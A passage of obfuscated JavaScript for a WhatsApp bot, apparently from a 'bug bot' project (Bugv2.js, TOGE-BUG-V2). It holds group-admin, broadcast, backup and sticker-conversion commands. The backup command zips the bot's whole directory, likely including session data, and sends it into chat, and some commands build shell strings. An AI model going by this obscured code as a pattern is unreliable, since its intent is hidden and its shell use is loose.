        global.packname = _0x327751.split('|')[0x0];
        global.author = _0x327751.split('|')[0x1];
        _0x5264ea("Exif successfully changed to\n\n• Packname : " + global.packname + "\n• Author : " + global.author);
        break;
      case 'setpp':
      case 'setpp':
      case "setppbot":
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        if (!_0x166763) {
          return _0x5264ea("Send/Reply Image With Caption " + (_0x4ca7f9 + _0x4210ff));
        }
        if (!/image/.test(_0x276cde)) {
          return _0x5264ea("Send/Reply Image With Caption " + (_0x4ca7f9 + _0x4210ff));
        }
        if (/webp/.test(_0x276cde)) {
          return _0x5264ea("Send/Reply Image With Caption " + (_0x4ca7f9 + _0x4210ff));
        }
        var _0x5d1dea = await _0x486fbc.downloadAndSaveMediaMessage(_0x166763, "ppbot.jpeg");
        if (_0x1541ad[0x0] == 'full') {
          var {
            img: _0x571048
          } = await generateProfilePicture(_0x5d1dea);
          await _0x486fbc.query({
            'tag': 'iq',
            'attrs': {
              'to': _0x8e3aaf,
              'type': "set",
              'xmlns': "w:profile:picture"
            },
            'content': [{
              'tag': "picture",
              'attrs': {
                'type': "image"
              },
              'content': _0x571048
            }]
          });
          fs.unlinkSync(_0x5d1dea);
          _0x5264ea(mess.done);
        } else {
          var _0x47e0eb = await _0x486fbc.updateProfilePicture(_0x8e3aaf, {
            'url': _0x5d1dea
          });
          fs.unlinkSync(_0x5d1dea);
          _0x5264ea(mess.done);
        }
        break;
      case 'block':
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        let _0x165407 = _0xa01f7.mentionedJid[0x0] ? _0xa01f7.mentionedJid[0x0] : _0xa01f7.quoted ? _0xa01f7.quoted.sender : _0x327751.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        await _0x486fbc.updateBlockStatus(_0x165407, "block").then(_0x2b042d => _0x5264ea(json(_0x2b042d)))['catch'](_0x12abcf => _0x5264ea(json(_0x12abcf)));
        break;
      case "unblock":
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        let _0x50e4a5 = _0xa01f7.mentionedJid[0x0] ? _0xa01f7.mentionedJid[0x0] : _0xa01f7.quoted ? _0xa01f7.quoted.sender : _0x327751.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        await _0x486fbc.updateBlockStatus(_0x50e4a5, "unblock").then(_0x4b1159 => _0x5264ea(json(_0x4b1159)))['catch'](_0x57e279 => _0x5264ea(json(_0x57e279)));
        break;
      case "leave":
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        _0x5264ea("Bye Everyone 🥺");
        await _0x486fbc.groupLeave(_0xa01f7.chat);
        break;
      case 'backup':
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        if (_0xa01f7.isGroup) {
          return _0x5264ea(mess["private"]);
        }
        _0x5264ea(mess.wait);
        exec("zip backup.zip *");
        let _0x2895b0 = await fs.readFileSync("./backup.zip");
        await _0x486fbc.sendMessage(_0xa01f7.chat, {
          'document': _0x2895b0,
          'mimetype': 'application/zip',
          'fileName': "backup.zip"
        }, {
          'quoted': _0xa01f7
        });
        break;
      case "bcgc":
      case "bcgroup":
        {
          if (!_0x36f85a) {
            return _0x5264ea(mess.owner);
          }
          if (!_0x327751) {
            return _0x5264ea("Which text?\n\nExample : " + (_0x4ca7f9 + _0x4210ff) + " It's holiday tomorrow ");
          }
          let _0x2909f0 = await _0x486fbc.groupFetchAllParticipating();
          let _0x236dec = Object.entries(_0x2909f0).slice(0x0).map(_0x199337 => _0x199337[0x1]);
          let _0x51acf8 = _0x236dec.map(_0x3e6132 => _0x3e6132.id);
          _0x5264ea("Send Broadcast To " + _0x51acf8.length + " Group Chat, End Time " + _0x51acf8.length * 1.5 + " second");
          for (let _0x5c79c4 of _0x51acf8) {
            await sleep(0x5dc);
            let _0x43d779 = "```" + ("\n\n" + _0x327751 + "\n\n") + "```" + "\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ";
            _0x486fbc.sendMessage(_0x5c79c4, {
              'text': _0x43d779,
              'contextInfo': {
                'externalAdReply': {
                  'showAdAttribution': true,
                  'title': "Broadcast By Owner",
                  'body': "Sent " + _0x5c79c4.length + " Group",
                  'thumbnailUrl': "https://i.imgur.com/6xnvbn3.png",
                  'sourceUrl': global.link,
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            });
          }
          _0x5264ea("Successfully Sent Broadcast To " + _0x51acf8.length + " Group");
        }
        break;
      case "getcase":
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        _0x5264ea('' + ("case" + ("'" + q + "'") + fs.readFileSync('Bugv2.js').toString().split("case '" + q + "'")[0x1].split("break")[0x0] + "break"));
        break;
      case "delete":
      case "del":
        {
          if (!_0x36f85a) {
            return _0x5264ea(mess.done);
          }
          if (!_0xa01f7.quoted) {
            throw false;
          }
          let {
            chat: _0x4fbf57,
            fromMe: _0x40e86a,
            id: _0x4290f1,
            isBaileys: _0x2280a4
          } = _0xa01f7.quoted;
          if (!_0x2280a4) {
            return _0x5264ea("The message was not sent by a bot!");
          }
          _0x486fbc.sendMessage(_0xa01f7.chat, {
            'delete': {
              'remoteJid': _0xa01f7.chat,
              'fromMe': true,
              'id': _0xa01f7.quoted.id,
              'participant': _0xa01f7.quoted.sender
            }
          });
        }
        break;
      case 'closetime':
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (!_0x139a8b && !_0x36f85a) {
          return _0x5264ea(mess.admin);
        }
        if (!_0x5d7e50) {
          return _0x5264ea(mess.botAdmin);
        }
        if (_0x1541ad[0x1] == 'detik') {
          var _0x4412f5 = _0x1541ad[0x0] * "1000";
        } else {
          if (_0x1541ad[0x1] == 'menit') {
            var _0x4412f5 = _0x1541ad[0x0] * "60000";
          } else {
            if (_0x1541ad[0x1] == "jam") {
              var _0x4412f5 = _0x1541ad[0x0] * "3600000";
            } else {
              if (_0x1541ad[0x1] == "hari") {
                var _0x4412f5 = _0x1541ad[0x0] * "86400000";
              } else {
                return _0x5264ea("*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second");
              }
            }
          }
        }
        _0x5264ea("Close time " + q + " starting from now");
        setTimeout(() => {
          _0x486fbc.groupSettingUpdate(_0xa01f7.chat, 'announcement');
          _0x5264ea("*Closed* group closed by admin\nnow only admin can send messages");
        }, _0x4412f5);
        break;
      case "opentime":
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (!_0x139a8b && !_0x36f85a) {
          return _0x5264ea(mess.admin);
        }
        if (!_0x5d7e50) {
          return _0x5264ea(mess.botAdmin);
        }
        if (_0x1541ad[0x1] == "second") {
          var _0x4412f5 = _0x1541ad[0x0] * "1000";
        } else {
          if (_0x1541ad[0x1] == "minute") {
            var _0x4412f5 = _0x1541ad[0x0] * "60000";
          } else {
            if (_0x1541ad[0x1] == "hour") {
              var _0x4412f5 = _0x1541ad[0x0] * "3600000";
            } else {
              if (_0x1541ad[0x1] == 'day') {
                var _0x4412f5 = _0x1541ad[0x0] * "86400000";
              } else {
                return _0x5264ea("*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second");
              }
            }
          }
        }
        _0x5264ea("Open time " + q + " starting from now");
        setTimeout(() => {
          _0x486fbc.groupSettingUpdate(_0xa01f7.chat, "not_announcement");
          _0x5264ea("*Opened* The group is opened by admin\nNow members can send messages");
        }, _0x4412f5);
        break;
      case "kick":
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (!_0x139a8b && !_0x22d052 && !_0x36f85a) {
          return _0x5264ea(mess.admin);
        }
        if (!_0x5d7e50) {
          return _0x5264ea(mess.botAdmin);
        }
        let _0x5af0de = _0xa01f7.mentionedJid[0x0] ? _0xa01f7.mentionedJid[0x0] : _0xa01f7.quoted ? _0xa01f7.quoted.sender : _0x327751.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        await _0x486fbc.groupParticipantsUpdate(_0xa01f7.chat, [_0x5af0de], "remove").then(_0x5380e5 => _0x5264ea(json(_0x5380e5)))["catch"](_0x32ffd6 => _0x5264ea(json(_0x32ffd6)));
        break;
      case "add":
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (!_0x139a8b && !_0x22d052 && !_0x36f85a) {
          return _0x5264ea(mess.admin);
        }
        if (!_0x5d7e50) {
          return _0x5264ea(mess.botAdmin);
        }
        let _0x4aab03 = _0xa01f7.quoted ? _0xa01f7.quoted.sender : _0x327751.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        await _0x486fbc.groupParticipantsUpdate(_0xa01f7.chat, [_0x4aab03], 'add').then(_0x104ae8 => _0x5264ea(json(_0x104ae8)))['catch'](_0x31aa16 => _0x5264ea(json(_0x31aa16)));
        break;
      case "promote":
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (!_0x139a8b && !_0x22d052 && !_0x36f85a) {
          return _0x5264ea(mess.admin);
        }
        if (!_0x5d7e50) {
          return _0x5264ea(mess.botAdmin);
        }
        let _0x29425f = _0xa01f7.mentionedJid[0x0] ? _0xa01f7.mentionedJid[0x0] : _0xa01f7.quoted ? _0xa01f7.quoted.sender : _0x327751.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        await _0x486fbc.groupParticipantsUpdate(_0xa01f7.chat, [_0x29425f], "promote").then(_0x389d6a => _0x5264ea(json(_0x389d6a)))["catch"](_0x2c6c65 => _0x5264ea(json(_0x2c6c65)));
        break;
      case "demote":
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (!_0x139a8b && !_0x22d052 && !_0x36f85a) {
          return _0x5264ea(mess.admin);
        }
        if (!_0x5d7e50) {
          return _0x5264ea(mess.botAdmin);
        }
        let _0x441bc0 = _0xa01f7.mentionedJid[0x0] ? _0xa01f7.mentionedJid[0x0] : _0xa01f7.quoted ? _0xa01f7.quoted.sender : _0x327751.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        await _0x486fbc.groupParticipantsUpdate(_0xa01f7.chat, [_0x441bc0], 'demote').then(_0x413aae => _0x5264ea(json(_0x413aae)))["catch"](_0x707e10 => _0x5264ea(json(_0x707e10)));
        break;
      case "setname":
      case "setsubject":
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (!_0x139a8b && !_0x22d052 && !_0x36f85a) {
          return _0x5264ea(mess.admin);
        }
        if (!_0x5d7e50) {
          return _0x5264ea(mess.botAdmin);
        }
        if (!_0x327751) {
          return "Text ?";
        }
        await _0x486fbc.groupUpdateSubject(_0xa01f7.chat, _0x327751).then(_0x260f39 => _0x5264ea(mess.success))['catch'](_0x102f90 => _0x5264ea(json(_0x102f90)));
        break;
      case "setdesc":
      case 'setdesk':
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (!_0x139a8b && !_0x22d052 && !_0x36f85a) {
          return _0x5264ea(mess.admin);
        }
        if (!_0x5d7e50) {
          return _0x5264ea(mess.botAdmin);
        }
        if (!_0x327751) {
          return "Text ?";
        }
        await _0x486fbc.groupUpdateDescription(_0xa01f7.chat, _0x327751).then(_0x546a17 => _0x5264ea(mess.success))["catch"](_0x37f966 => _0x5264ea(json(_0x37f966)));
        break;
      case "setppgroup":
      case "setppgrup":
      case "setppgc":
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (!_0x139a8b) {
          return _0x5264ea(mess.admin);
        }
        if (!_0x5d7e50) {
          return _0x5264ea(mess.botAdmin);
        }
        if (!_0x166763) {
          return _0x5264ea("Send/Reply Image With Caption " + (_0x4ca7f9 + _0x4210ff));
        }
        if (!/image/.test(_0x276cde)) {
          return _0x5264ea("Send/Reply Image With Caption " + (_0x4ca7f9 + _0x4210ff));
        }
        if (/webp/.test(_0x276cde)) {
          return _0x5264ea("Send/Reply Image With Caption " + (_0x4ca7f9 + _0x4210ff));
        }
        var _0x5d1dea = await _0x486fbc.downloadAndSaveMediaMessage(_0x166763, "ppbot.jpeg");
        if (_0x1541ad[0x0] == "full") {
          var {
            img: _0x571048
          } = await generateProfilePicture(_0x5d1dea);
          await _0x486fbc.query({
            'tag': 'iq',
            'attrs': {
              'to': _0xa01f7.chat,
              'type': 'set',
              'xmlns': 'w:profile:picture'
            },
            'content': [{
              'tag': 'picture',
              'attrs': {
                'type': "image"
              },
              'content': _0x571048
            }]
          });
          fs.unlinkSync(_0x5d1dea);
          _0x5264ea(mess.done);
        } else {
          var _0x47e0eb = await _0x486fbc.updateProfilePicture(_0xa01f7.chat, {
            'url': _0x5d1dea
          });
          fs.unlinkSync(_0x5d1dea);
          _0x5264ea(mess.done);
        }
        break;
      case "tagall":
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (!_0x139a8b && !_0x22d052 && !_0x36f85a) {
          return _0x5264ea(mess.admin);
        }
        if (!_0x5d7e50) {
          return _0x5264ea(mess.botAdmin);
        }
        let _0x2e707d = "*👥 Tag All*\n \n                 🗞️ *Message : " + (q ? q : "blank") + "*\n\n";
        for (let _0xb3a4be of _0x216108) {
          _0x2e707d += "• @" + _0xb3a4be.id.split('@')[0x0] + "\n";
        }
        _0x486fbc.sendMessage(_0xa01f7.chat, {
          'text': _0x2e707d,
          'mentions': _0x216108.map(_0x26fd7f => _0x26fd7f.id)
        }, {
          'quoted': _0xa01f7
        });
        break;
      case "hidetag":
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (!_0x139a8b && !_0x22d052 && !_0x36f85a) {
          return _0x5264ea(mess.admin);
        }
        if (!_0x5d7e50) {
          return _0x5264ea(mess.botAdmin);
        }
        _0x486fbc.sendMessage(_0xa01f7.chat, {
          'text': q ? q : '',
          'mentions': _0x216108.map(_0x38c96e => _0x38c96e.id)
        }, {
          'quoted': _0xa01f7
        });
        break;
      case "totag":
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (!_0x5d7e50) {
          return _0x5264ea(mess.botAdmin);
        }
        if (!_0x139a8b) {
          return _0x5264ea(mess.admin);
        }
        if (!_0xa01f7.quoted) {
          return _0x5264ea("Reply messages with captions " + (_0x4ca7f9 + _0x4210ff));
        }
        _0x486fbc.sendMessage(_0xa01f7.chat, {
          'forward': _0xa01f7.quoted.fakeObj,
          'mentions': _0x216108.map(_0xb6aed0 => _0xb6aed0.id)
        });
        break;
      case "group":
      case "grup":
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (!_0x139a8b && !_0x22d052 && !_0x36f85a) {
          return _0x5264ea(mess.admin);
        }
        if (!_0x5d7e50) {
          return _0x5264ea(mess.botAdmin);
        }
        if (_0x1541ad[0x0] === "close") {
          await _0x486fbc.groupSettingUpdate(_0xa01f7.chat, "announcement").then(_0x3af6e4 => _0x5264ea("Success In Closing The Group 🕊️"))["catch"](_0x83bf81 => _0x5264ea(json(_0x83bf81)));
        } else if (_0x1541ad[0x0] === "open") {
          await _0x486fbc.groupSettingUpdate(_0xa01f7.chat, "not_announcement").then(_0x538415 => _0x5264ea("Success In Opening The Group 🕊️"))['catch'](_0xe3f553 => _0x5264ea(json(_0xe3f553)));
        } else {
          _0x5264ea("Mode " + _0x4210ff + "\n\n\nType " + (_0x4ca7f9 + _0x4210ff) + "open/close");
        }
        break;
      case "editinfo":
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (!_0x139a8b && !_0x22d052 && !_0x36f85a) {
          return _0x5264ea(mess.admin);
        }
        if (!_0x5d7e50) {
          return _0x5264ea(mess.botAdmin);
        }
        if (_0x1541ad[0x0] === 'open') {
          await _0x486fbc.groupSettingUpdate(_0xa01f7.chat, "unlocked").then(_0x575b64 => _0x5264ea("Successfully Opened Group Edit Info 🕊️"))["catch"](_0x58dffb => _0x5264ea(json(_0x58dffb)));
        } else if (_0x1541ad[0x0] === 'close') {
          await _0x486fbc.groupSettingUpdate(_0xa01f7.chat, "locked").then(_0x2f2ea1 => _0x5264ea("Successfully Closed Group Edit Info🕊️"))["catch"](_0x30e3a4 => _0x5264ea(json(_0x30e3a4)));
        } else {
          _0x5264ea("Mode " + _0x4210ff + "\n\n\nType " + (_0x4ca7f9 + _0x4210ff) + "on/off");
        }
        break;
      case "linkgroup":
      case "grouplink":
      case "linkgrup":
      case "linkgc":
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (!_0x139a8b && !_0x22d052 && !_0x36f85a) {
          return _0x5264ea(mess.admin);
        }
        if (!_0x5d7e50) {
          return _0x5264ea(mess.botAdmin);
        }
        let _0x3b8af5 = await _0x486fbc.groupInviteCode(_0xa01f7.chat);
        _0x486fbc.sendText(_0xa01f7.chat, "👥 *GROUP LINK INFO*\n📛 *Name :* " + _0x342df8.subject + "\n👤 *Group Owner :* " + (_0x342df8.owner !== undefined ? '@' + _0x342df8.owner.split`@`[0x0] : "Not known") + "\n🌱 *ID :* " + _0x342df8.id + "\n🔗 *Chat Link :* https://chat.whatsapp.com/" + _0x3b8af5 + "\n👥 *Member :* " + _0x342df8.participants.length + "\n", _0xa01f7, {
          'detectLink': true
        });
        break;
      case "revoke":
      case "resetlink":
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (!_0x139a8b && !_0x22d052 && !_0x36f85a) {
          return _0x5264ea(mess.admin);
        }
        if (!_0x5d7e50) {
          return _0x5264ea(mess.botAdmin);
        }
        await _0x486fbc.groupRevokeInvite(_0xa01f7.chat).then(_0x436b91 => {
          _0x5264ea("Successful Reset, Group Invite Link " + _0x342df8.subject);
        })["catch"](_0x6b0a15 => _0x5264ea(json(_0x6b0a15)));
        break;
      case 'p':
      case "ping":
        {
          const _0x440622 = process.memoryUsage();
          const _0x4f1dd5 = os.cpus().map(_0x11e830 => {
            _0x11e830.total = Object.keys(_0x11e830.times).reduce((_0xafaa78, _0x1c1ed9) => _0xafaa78 + _0x11e830.times[_0x1c1ed9], 0x0);
            return _0x11e830;
          });
          const _0x109953 = _0x4f1dd5.reduce((_0x174872, _0x1ca4e2, _0x5def4e, {
            length: _0x21797d
          }) => {
            _0x174872.total += _0x1ca4e2.total;
            _0x174872.speed += _0x1ca4e2.speed / _0x21797d;
            _0x174872.times.user += _0x1ca4e2.times.user;
            _0x174872.times.nice += _0x1ca4e2.times.nice;
            _0x174872.times.sys += _0x1ca4e2.times.sys;
            _0x174872.times.idle += _0x1ca4e2.times.idle;
            _0x174872.times.irq += _0x1ca4e2.times.irq;
            return _0x174872;
          }, {
            'speed': 0x0,
            'total': 0x0,
            'times': {
              'user': 0x0,
              'nice': 0x0,
              'sys': 0x0,
              'idle': 0x0,
              'irq': 0x0
            }
          });
          let _0x49f24b = speed();
          let _0xcee1a = speed() - _0x49f24b;
          neww = performance.now();
          oldd = performance.now();
          respon = ("\n*_Response Speed_* " + _0xcee1a.toFixed(0x4) + " *_Second_* \n " + (oldd - neww) + " *_miliseconds_*\n\n*_Runtime :_* " + runtime(process.uptime()) + "\n\n💨 *_Info Server.._*\n*RAM:* " + formatp(os.totalmem() - os.freemem()) + " / " + formatp(os.totalmem()) + "\n\n*NodeJS Memory Usaage*\n" + Object.keys(_0x440622).map((_0x497b3e, _0x358f31, _0x146b89) => _0x497b3e.padEnd(Math.max(..._0x146b89.map(_0x30a52b => _0x30a52b.length)), " ") + ": " + formatp(_0x440622[_0x497b3e])).join("\n") + "\n\n" + (_0x4f1dd5[0x0] ? "*Total CPU Usage*\n" + _0x4f1dd5[0x0].model.trim() + " (" + _0x109953.speed + " MHZ)\n" + Object.keys(_0x109953.times).map(_0x575104 => "- *" + (_0x575104 + '*').padEnd(0x6) + ": " + (0x64 * _0x109953.times[_0x575104] / _0x109953.total).toFixed(0x2) + '%').join("\n") + "\n*CPU Core(s) Usage (" + _0x4f1dd5.length + " Core CPU)*\n" + _0x4f1dd5.map((_0x31c7a4, _0x10a8e2) => _0x10a8e2 + 0x1 + ". " + _0x31c7a4.model.trim() + " (" + _0x31c7a4.speed + " MHZ)\n" + Object.keys(_0x31c7a4.times).map(_0x3a200d => "- *" + (_0x3a200d + '*').padEnd(0x6) + ": " + (0x64 * _0x31c7a4.times[_0x3a200d] / _0x31c7a4.total).toFixed(0x2) + '%').join("\n")).join("\n\n") : '') + "\n").trim();
          await _0x486fbc.sendMessage(_0xa01f7.chat, {
            'text': respon,
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': '' + botname,
                'body': _0xcee1a.toFixed(0x4) + " Second",
                'thumbnailUrl': "https://i.imgur.com/qlF3Uh6.jpeg",
                'sourceUrl': global.link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0xa01f7
          });
        }
        break;
      case "buypremium":
      case 'buyprem':
      case "premium":
        {
          let _0x2a1cec = "Hi " + _0xa29745 + "👋\nWant to Buy Premium? Just chat with the owner😉";
          await _0x486fbc.sendMessage(_0xa01f7.chat, {
            'text': _0x2a1cec,
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': '' + botname,
                'body': '' + ownername,
                'thumbnailUrl': "https://i.imgur.com/qlF3Uh6.jpeg",
                'sourceUrl': global.link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0xa01f7
          });
        }
        break;
      case 'runtime':
        let _0x3f2d70 = "𝚃𝙾𝙶𝙴-𝙱𝚄𝙶-𝚅𝟸 𝙷𝙰𝚅𝙴𝚂 𝙱𝙴𝙴𝙽 𝚁𝚄𝙽𝙽𝙸𝙽𝙶 𝙵𝙾𝚁 " + runtime(process.uptime());
        _0x486fbc.sendMessage(_0xa01f7.chat, {
          'text': _0x3f2d70,
          'contextInfo': {
            'externalAdReply': {
              'showAdAttribution': true,
              'title': '' + botname,
              'body': "FORGET DONATE",
              'thumbnailUrl': 'https://telegra.ph/file/97c008170fe8e6e714a32.jpg',
              'sourceUrl': global.link,
              'mediaType': 0x1,
              'renderLargerThumbnail': true
            }
          }
        }, {
          'quoted': _0xa01f7
        });
        break;
      case 'sc':
      case "script":
      case 'scriptbot':
        _0x486fbc.sendMessage(_0xa01f7.chat, {
          'text': "*whatsapp_chain :* https://whatsapp.com/channel/0029Vakp0UnICVfe3I2Fe72w\n\n*YOUTUBE :* https://www.youtube.com/@DRK-TECH\n\n*BUG BOT :* https://github.com/DRK-S-TEN/DRK_ST_BUG1?tab=readme-ov-file",
          'contextInfo': {
            'externalAdReply': {
              'showAdAttribution': true,
              'title': '' + botname,
              'body': "SCRIPT OF " + botname,
              'thumbnailUrl': "https://i.imgur.com/EFDwdHt.jpeg",
              'sourceUrl': global.link,
              'mediaType': 0x1,
              'renderLargerThumbnail': true
            }
          }
        }, {
          'quoted': _0xa01f7
        });
        break;
      case 'donate':
      case "donasi":
        let _0x597d3e = "Hello Brother " + _0xa29745 + "\n\nNo matter how much you donate is very valuable for us";
        _0x486fbc.sendMessage(_0xa01f7.chat, {
          'text': "𝚖𝚊𝚍𝚎 𝚊 𝚍𝚎𝚙𝚘𝚜𝚒𝚝 𝚘𝚗 𝚝𝚑𝚒𝚜 𝚗𝚞𝚖𝚋𝚎𝚛: +24105114159 \n\n" + _0x597d3e
        }, {
          'quoted': _0xa01f7
        });
        break;
      case "owner":
        {
          const _0x41e64b = await _0x486fbc.sendMessage(_0x1c6c8b, {
            'contacts': {
              'displayName': _0x1ec162.length + " Contact",
              'contacts': _0x1ec162
            },
            'mentions': [_0x5ea771]
          }, {
            'quoted': _0xa01f7
          });
          _0x486fbc.sendMessage(_0x1c6c8b, {
            'text': "𝚑𝚎𝚕𝚕𝚘 @" + _0x5ea771.split('@')[0x0] + ", 𝚝𝚑𝚒𝚜 𝚒𝚜 𝚖𝚢 𝚘𝚠𝚗𝚎𝚛",
            'mentions': [_0x5ea771]
          }, {
            'quoted': _0x41e64b
          });
        }
        break;
      case "sticker":
      case "stiker":
      case 's':
        {
          if (!_0x166763) {
            return _0x5264ea("Reply to Video/Image With Caption " + (_0x4ca7f9 + _0x4210ff));
          }
          if (/image/.test(_0x276cde)) {
            let _0x56887a = await _0x166763.download();
            let _0x4a894b = await _0x486fbc.sendImageAsSticker(_0xa01f7.chat, _0x56887a, _0xa01f7, {
              'packname': packname,
              'author': author
            });
            await fs.unlinkSync(_0x4a894b);
          } else {
            if (_0x19ad4a || /video/.test(_0x276cde)) {
              if ((_0x166763.msg || _0x166763).seconds > 0xb) {
                return _0x5264ea("Maximum 10 seconds!");
              }
              let _0x4e6073 = await _0x166763.download();
              let _0x4be046 = await _0x486fbc.sendVideoAsSticker(_0xa01f7.chat, _0x4e6073, _0xa01f7, {
                'packname': packname,
                'author': author
              });
              await fs.unlinkSync(_0x4be046);
            } else {
              return _0x5264ea("Send Images/Videos With Captions " + (_0x4ca7f9 + _0x4210ff) + "\nVideo Duration 1-9 Seconds");
            }
          }
        }
        break;
      case "smeme":
        {
          let _0x2b018a = "Send/Reply image/sticker with caption " + (_0x4ca7f9 + _0x4210ff) + " text1|text2";
          if (!/image/.test(_0x276cde)) {
            return _0x5264ea(_0x2b018a);
          }
          if (!_0x327751) {
            return _0x5264ea(_0x2b018a);
          }
          _0x5264ea(mess.wait);
          atas = _0x327751.split('|')[0x0] ? _0x327751.split('|')[0x0] : '-';
          bawah = _0x327751.split('|')[0x1] ? _0x327751.split('|')[0x1] : '-';
          let _0x1e0648 = await _0x486fbc.downloadAndSaveMediaMessage(_0x5a97f9);
          let _0x20d2d5 = await TelegraPh(_0x1e0648);
          let _0x520460 = 'https://api.memegen.link/images/custom/' + encodeURIComponent(bawah) + '/' + encodeURIComponent(atas) + ".png?background=" + _0x20d2d5;
          let _0x5370c0 = await _0x486fbc.sendImageAsSticker(_0xa01f7.chat, _0x520460, _0xa01f7, {
            'packname': packname,
            'author': author
          });
          fs.unlinkSync(_0x5370c0);
        }
        break;
      case "swm":
      case "steal":
      case "stickerwm":
      case 'take':
        {
          if (!_0x1541ad.join(" ")) {
            return _0x5264ea("Where is the text?");
          }
          if (_0xa01f7.quoted.isAnimated === true) {
            _0x486fbc.downloadAndSaveMediaMessage(_0x166763, 'gifee');
            _0x486fbc.sendMessage(_0x1c6c8b, {
              'sticker': fs.readFileSync('gifee.webp')
            }, {
              'quoted': _0xa01f7
            });
          } else {
            if (/image/.test(_0x276cde)) {} else {
              if (/video/.test(_0x276cde)) {
                if ((_0x166763.msg || _0x166763).seconds > 0xb) {
                  return _0x5264ea("Maximum 10 Seconds!");
                }
              } else {
                _0x5264ea("Photo/Video?");
              }
            }
          }
        }
        break;
      case "toimage":
      case "toimg":
        {
          if (!/webp/.test(_0x276cde)) {
            return _0x5264ea("Reply sticker with caption *" + (_0x4ca7f9 + _0x4210ff) + '*');
          }
          _0x5264ea(mess.wait);
          let _0x5dcfd8 = await _0x486fbc.downloadAndSaveMediaMessage(_0x5a97f9);
          let _0x5ced79 = await getRandom(".png");
          exec("ffmpeg -i " + _0x5dcfd8 + " " + _0x5ced79, _0x3763ca => {
            fs.unlinkSync(_0x5dcfd8);
            if (_0x3763ca) {
              return _0x3763ca;
            }
            let _0x37d05b = fs.readFileSync(_0x5ced79);
            _0x486fbc.sendMessage(_0xa01f7.chat, {
              'image': _0x37d05b
            }, {
              'quoted': _0xa01f7
            });
            fs.unlinkSync(_0x5ced79);
          });
        }
        break;
      case "tomp4":
      case "tovideo":
        {
          if (!/webp/.test(_0x276cde)) {
            return _0x5264ea("Reply sticker with caption *" + (_0x4ca7f9 + _0x4210ff) + '*');
          }
          _0x5264ea(mess.wait);
          let _0x219f4f = await _0x486fbc.downloadAndSaveMediaMessage(_0x5a97f9);
          let _0x50c46c = await webp2mp4File(_0x219f4f);
          await _0x486fbc.sendMessage(_0xa01f7.chat, {
            'video': {
              'url': _0x50c46c.result,
              'caption': "Convert Webp To Video"
            }
          }, {
            'quoted': _0xa01f7
          });
          await fs.unlinkSync(_0x219f4f);
        }
        break;
      case "toaud":
      case 'toaudio':
        {
          if (!/video/.test(_0x276cde) && !/audio/.test(_0x276cde)) {
            return _0x5264ea("Send/Reply Video/Audio that you want to make into audio with caption " + (_0x4ca7f9 + _0x4210ff));
          }
          _0x5264ea(mess.wait);
          let _0x2f0c4b = await _0x486fbc.downloadMediaMessage(_0x5a97f9);
          let _0x3d654b = await toAudio(_0x2f0c4b, "mp4");
          _0x486fbc.sendMessage(_0xa01f7.chat, {
            'audio': _0x3d654b,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0xa01f7
          });
        }
        break;
      case 'tomp3':
        {
          if (!/video/.test(_0x276cde) && !/audio/.test(_0x276cde)) {
            return _0x5264ea("Send/Reply Video/Audio that you want to make into MP3 with caption " + (_0x4ca7f9 + _0x4210ff));
          }
          _0x5264ea(mess.wait);
          let _0xbbe325 = await _0x486fbc.downloadMediaMessage(_0x5a97f9);
          let _0x48d31d = await toAudio(_0xbbe325, 'mp4');
          _0x486fbc.sendMessage(_0xa01f7.chat, {
            'document': _0x48d31d,
            'mimetype': 'audio/mp3',
            'fileName': 'dgxeon.mp3'
          }, {
            'quoted': _0xa01f7
          });
        }
        break;
      case "tovn":
      case "toptt":
        {
          if (!/video/.test(_0x276cde) && !/audio/.test(_0x276cde)) {
            return _0x5264ea("Reply Video/Audio that you want to make into a VN with caption " + (_0x4ca7f9 + _0x4210ff));
          }
          _0x5264ea(mess.wait);
          let _0x397e7b = await _0x486fbc.downloadMediaMessage(_0x5a97f9);
          let {
            toPTT: _0x1e20c4
          } = require("./lib/converter");
          let _0x14b42e = await _0x1e20c4(_0x397e7b, "mp4");
